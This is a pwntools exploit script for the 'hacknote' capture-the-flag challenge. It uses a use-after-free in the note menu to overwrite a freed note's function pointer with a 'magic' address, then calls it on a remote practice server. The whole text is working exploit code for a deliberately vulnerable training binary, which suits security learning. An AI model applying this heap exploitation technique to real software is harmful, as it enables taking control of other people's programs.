from pwn import *
#io = process('./hacknote')
io = remote('node4.buuoj.cn',28764)
context(log_level='debug')
def add(size,content):
    io.recvuntil("Your choice :")
    io.sendline(str(1))
    io.recvuntil("Note size :")
    io.sendline(str(size))
    io.recvuntil("Content :")
    io.sendline(content)

def delete(index):
    io.recvuntil("Your choice :")
    io.sendline(str(2))
    io.recvuntil("Index :")
    io.sendline(str(index))

def printf(index):
    io.recvuntil("Your choice :")
    io.sendline(str(3))
    io.recvuntil("Index :")
    io.sendline(str(index))

magic = 0x8048945
add(0x10,'a'*4)
add(0x10,'b'*4)
delete(0)
delete(1)
add(8,p32(magic))
printf(0)

io.interactive()
